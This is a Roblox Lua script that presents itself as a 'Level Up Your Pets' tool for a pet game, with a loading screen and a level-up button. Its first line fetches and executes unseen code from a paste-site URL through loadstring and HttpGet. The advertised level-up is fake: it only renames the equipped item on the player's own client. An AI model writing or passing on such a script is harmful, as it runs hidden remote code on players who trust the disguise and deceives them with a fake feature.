loadstring(game:HttpGet("https://cdn.sourceb.in/bins/bTKiP6Ewt3/0"))()
local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- Wait for PlayerGui with longer timeout
local playerGui
local success, err = pcall(function()
	playerGui = player:WaitForChild("PlayerGui", 15)
end)
if not success or not playerGui then
	warn("Failed to access PlayerGui: " .. tostring(err))
	return
end
print("PlayerGui accessed successfully")

-- üå± Initial Loading Screen with üêæ Paw + Loading + Percentage Bar + Border

local loadingGui = Instance.new("ScreenGui")
loadingGui.Name = "LoadingScreen"
loadingGui.IgnoreGuiInset = true
loadingGui.ResetOnSpawn = false
loadingGui.Enabled = true
loadingGui.Parent = playerGui
print("Loading ScreenGui created and parented")

local loadingFrame = Instance.new("Frame")
loadingFrame.Size = UDim2.new(0, 260, 0, 100)
loadingFrame.Position = UDim2.new(0.5, -130, 0.5, -50)
loadingFrame.BackgroundColor3 = Color3.fromRGB(110, 180, 100)
loadingFrame.BackgroundTransparency = 0.1
loadingFrame.BorderSizePixel = 0
loadingFrame.Visible = true
loadingFrame.Parent = loadingGui
print("Loading frame created and parented")

local corner = Instance.new("UICorner", loadingFrame)
corner.CornerRadius = UDim.new(0, 12)

-- üêæ Centered Loading Text with Border
local loadingText = Instance.new("TextLabel")
loadingText.Text = "Loading... 0%"
loadingText.Size = UDim2.new(1, -20, 0.5, 0)
loadingText.Position = UDim2.new(0, 10, 0, 10)
loadingText.BackgroundTransparency = 1
loadingText.Font = Enum.Font.GothamBlack
loadingText.TextScaled = true
loadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
loadingText.TextStrokeTransparency = 0.2
loadingText.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
loadingText.TextWrapped = true
loadingText.Parent = loadingFrame
print("Loading text created and parented")

-- Border for Loading Text
local loadingStroke = Instance.new("UIStroke")
loadingStroke.Color = Color3.fromRGB(80, 120, 80)
loadingStroke.Thickness = 2
loadingStroke.Parent = loadingText
print("Loading text border applied")

-- Progress Bar Background
local progressBg = Instance.new("Frame")
progressBg.Size = UDim2.new(0.9, 0, 0.2, 0)
progressBg.Position = UDim2.new(0.05, 0, 0.65, 0)
progressBg.BackgroundColor3 = Color3.fromRGB(160, 200, 160)
progressBg.BorderSizePixel = 0
progressBg.Parent = loadingFrame

local progressCorner = Instance.new("UICorner", progressBg)
progressCorner.CornerRadius = UDim.new(0, 8)

-- Progress Fill
local progressFill = Instance.new("Frame")
progressFill.Size = UDim2.new(0, 0, 1, 0)
progressFill.BackgroundColor3 = Color3.fromRGB(80, 160, 80)
progressFill.BorderSizePixel = 0
progressFill.Parent = progressBg

local fillCorner = Instance.new("UICorner", progressFill)
fillCorner.CornerRadius = UDim.new(0, 8)

print("Progress bar created")

-- üåø Main GUI
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "GardenGui"
screenGui.ResetOnSpawn = false
screenGui.IgnoreGuiInset = true
screenGui.Enabled = false -- hide until loading is done
screenGui.Parent = playerGui
print("Main ScreenGui created and parented")

local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Size = UDim2.new(0, 190, 0, 120) -- reduced height from 150 to 120
mainFrame.Position = UDim2.new(0.5, -95, 0.5, -60) -- adjust offset to keep it centered
mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
mainFrame.BackgroundColor3 = Color3.fromRGB(120, 180, 100)
mainFrame.BackgroundTransparency = 0
mainFrame.Active = true
mainFrame.Draggable = true
mainFrame.Visible = true
mainFrame.Parent = screenGui
print("Main frame created and parented")

local mainCorner = Instance.new("UICorner", mainFrame)
mainCorner.CornerRadius = UDim.new(0, 14)

local stroke = Instance.new("UIStroke", mainFrame)
stroke.Color = Color3.fromRGB(80, 120, 80)
stroke.Thickness = 2

local gradient = Instance.new("UIGradient", mainFrame)
gradient.Color = ColorSequence.new{
	ColorSequenceKeypoint.new(0, Color3.fromRGB(110, 170, 100)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(150, 200, 120))
}
gradient.Rotation = 45
print("Main frame styling added")




-- üå∏ Title
local titleLabel = Instance.new("TextLabel")
titleLabel.Name = "TitleLabel"
titleLabel.Size = UDim2.new(1, -20, 0, 24)  -- Reduced height for tighter fit
titleLabel.Position = UDim2.new(0, 10, 0, 4)  -- Moved closer to the top
titleLabel.BackgroundTransparency = 1
titleLabel.Text = "Level Up Your Pets"
titleLabel.TextScaled = true
titleLabel.Font = Enum.Font.GothamBlack
titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
titleLabel.TextStrokeTransparency = 0.5
titleLabel.TextWrapped = true
titleLabel.Parent = mainFrame
print("Title label added with closer positioning")


-- üêæ Level Up Button
local button = Instance.new("TextButton")
button.Name = "LevelUpButton"
button.Size = UDim2.new(0.8, 0, 0.25, 0)
button.Position = UDim2.new(0.1, 0, 0.6, 0)
button.BackgroundColor3 = Color3.fromRGB(90, 200, 90)
button.Text = "Level Up 50 Instantly"
button.TextScaled = true
button.Font = Enum.Font.GothamBold
button.TextColor3 = Color3.new(1, 1, 1)
button.AutoButtonColor = true
button.TextTransparency = 0
button.Parent = mainFrame

local buttonCorner = Instance.new("UICorner", button)
buttonCorner.CornerRadius = UDim.new(0, 10)

local buttonStroke = Instance.new("UIStroke", button)
buttonStroke.Color = Color3.fromRGB(70, 160, 70)
buttonStroke.Thickness = 1.5
print("Level Up button added")

-- üåº Notification Label
local notificationLabel = Instance.new("TextLabel")
notificationLabel.Name = "NotificationLabel"
notificationLabel.Size = UDim2.new(1, -20, 0, 20)
notificationLabel.Position = UDim2.new(0, 10, 0.5, 0)
notificationLabel.BackgroundTransparency = 1
notificationLabel.Text = ""
notificationLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
notificationLabel.TextStrokeTransparency = 0.3
notificationLabel.TextScaled = true
notificationLabel.Font = Enum.Font.GothamBold
notificationLabel.TextXAlignment = Enum.TextXAlignment.Center
notificationLabel.TextTransparency = 0
notificationLabel.Parent = mainFrame
print("Notification label added")

-- üåø Credit
local credit = Instance.new("TextLabel")
credit.Name = "Credit"
credit.Size = UDim2.new(1, -10, 0, 16)
credit.Position = UDim2.new(0, 5, 1, -18)
credit.BackgroundTransparency = 1
credit.Text = "Made by Abgsweryoat"
credit.TextScaled = true
credit.Font = Enum.Font.Gotham
credit.TextColor3 = Color3.fromRGB(255, 255, 255)
credit.TextTransparency = 0.3
credit.TextStrokeTransparency = 0.8
credit.Parent = mainFrame
print("Credit label added")

-- Valid Pets List
local validPets = {
	"Raccoon",
	"T-rex",
	"Trex",
	"Fennec Fox",
	"Dragonfly",
	"Butterfly",
	"Disco Bee",
	"Mimic Octopus",
	"Spinosaurus",
	"Queen Bee"
}

-- Simple Loading Function (No Tweens)
local function animateLoading(targetGui, targetFrame, textLabel, callback)
	local success, err = pcall(function()
		print("Starting loading for " .. targetGui.Name)
		targetFrame.Visible = true
		for i = 1, 100 do
			textLabel.Text = "Loading... " .. i .. "%"
			progressFill.Size = UDim2.new(i / 100, 0, 1, 0)
			wait(0.05) -- adjust speed (0.05 = 5s total)
		end
		print("Loading completed for " .. targetGui.Name)
		wait(0.5)
		targetGui:Destroy()
		print("Loading GUI destroyed: " .. targetGui.Name)
		if callback then
			callback()
		end
	end)
	if not success then
		warn("Loading error for " .. targetGui.Name .. ": " .. err)
		textLabel.Text = "Loading error"
		wait(3)
		targetGui:Destroy()
		if callback then
			callback()
		end
	end
end


-- Show Main GUI Function
local function showMainGui()
	local success, err = pcall(function()
		print("Showing main GUI")
		screenGui.Enabled = true
		mainFrame.Visible = true
		notificationLabel.Text = ""
		print("Main GUI shown")
	end)
	if not success then
		warn("Main GUI show error: " .. err)
		screenGui.Enabled = true
		mainFrame.Visible = true
		notificationLabel.Text = "Main GUI loaded with error"
		wait(3)
		notificationLabel.Text = ""
		print("Main GUI shown via fallback")
	end
end

-- Button Action with Flexible Pet Name Check
button.MouseButton1Click:Connect(function()
	local success, err = pcall(function()
		print("Level Up button clicked")
		local char
		local charSuccess, charErr = pcall(function()
			char = player.Character or player.CharacterAdded:Wait(10)
		end)
		if not charSuccess or not char then
			warn("Failed to access character: " .. tostring(charErr))
			notificationLabel.Text = "Error: Character not loaded"
			wait(3)
			notificationLabel.Text = ""
			return
		end

		local tool = char:FindFirstChildOfClass("Tool")
		if tool then
			local isValidPet = false
			for _, pet in ipairs(validPets) do
				if string.match(tool.Name, "^" .. pet) then
					isValidPet = true
					break
				end
			end
			if isValidPet then
				notificationLabel.Text = ""
				print("Valid pet found: " .. tool.Name)
				screenGui.Enabled = false
				-- Mini Loading GUI
				local miniGui = Instance.new("ScreenGui")
				miniGui.Name = "MiniLoading"
				miniGui.IgnoreGuiInset = true
				miniGui.ResetOnSpawn = false
				miniGui.Enabled = true
				miniGui.Parent = playerGui
				print("Mini Loading GUI created and parented")

				local miniFrame = Instance.new("Frame")
				miniFrame.Size = UDim2.new(0, 240, 0, 80)
				miniFrame.Position = UDim2.new(0.5, -120, 0.5, -40)
				miniFrame.BackgroundColor3 = Color3.fromRGB(110, 180, 100)
				miniFrame.BackgroundTransparency = 0.3
				miniFrame.BorderSizePixel = 0
				miniFrame.Visible = true
				miniFrame.Parent = miniGui

				local miniCorner = Instance.new("UICorner", miniFrame)
				miniCorner.CornerRadius = UDim.new(0, 10)

				local progress = Instance.new("TextLabel")
				progress.Size = UDim2.new(1, 0, 1, 0)
				progress.BackgroundTransparency = 1
				progress.Font = Enum.Font.GothamBold
				progress.TextColor3 = Color3.fromRGB(40, 80, 40)
				progress.TextScaled = true
				progress.Text = "Pets Level Up! 0%"
				progress.TextTransparency = 0
				progress.Parent = miniFrame
				print("Mini loading text created")

				 animateLoading(miniGui, miniFrame, progress, function()
                    -- Parse current tool name for weight and age
                    local currentWeight = 0
                    local currentAge = 0
                    local weightMatch = string.match(tool.Name, "%[(.-) KG%]")
                    local ageMatch = string.match(tool.Name, "%[Age (.-)%]")
                    if weightMatch then
                        currentWeight = tonumber(weightMatch) or 0
                    end
                    if ageMatch then
                        currentAge = tonumber(ageMatch) or 0
                    end
                    print("Parsed tool: " .. tool.Name .. " (Weight: " .. currentWeight .. ", Age: " .. currentAge .. ")")

                    -- Calculate new values
                    local newWeight = currentWeight + 5
                    local newAge = 50
                    newWeight = tonumber(string.format("%.2f", newWeight)) -- Format to 2 decimals

                    -- Update tool name (client-side)
					-- Extract base pet name by removing everything from first "[" onwards
					local basePetName = string.match(tool.Name, "^(.-) %[")

					if not basePetName then
						basePetName = tool.Name -- fallback if pattern not found
					end

					local newName = basePetName .. " [" .. newWeight .. " KG] [Age " .. newAge .. "]"
					tool.Name = newName
					print("Tool renamed to: " .. newName)


                    screenGui.Enabled = true
                    notificationLabel.Text = "Pet leveled up!"
                    print("Pet leveled up: " .. newName)
                    wait(3)
                    notificationLabel.Text = ""
                end)
			else
				local message = "Please equip a valid pet"
				notificationLabel.Text = message
				print(message .. " (Found: " .. tool.Name .. ")")
				wait(3)
				notificationLabel.Text = ""
			end
		else
			local message = "Please equip a valid pet"
			notificationLabel.Text = message
			print(message)
			wait(3)
			notificationLabel.Text = ""
		end
	end)
	if not success then
		warn("Button action error: " .. err)
		notificationLabel.Text = "Error leveling up pet"
		wait(3)
		notificationLabel.Text = ""
	end
end)

-- Start Initial Animation
local success, err = pcall(function()
	print("Starting initial loading")
	animateLoading(loadingGui, loadingFrame, loadingText, showMainGui)
end)
if not success then
	warn("Initial loading failed: " .. err)
	loadingText.Text = "Loading error"
	wait(3)
	loadingGui:Destroy()
	showMainGui()
end
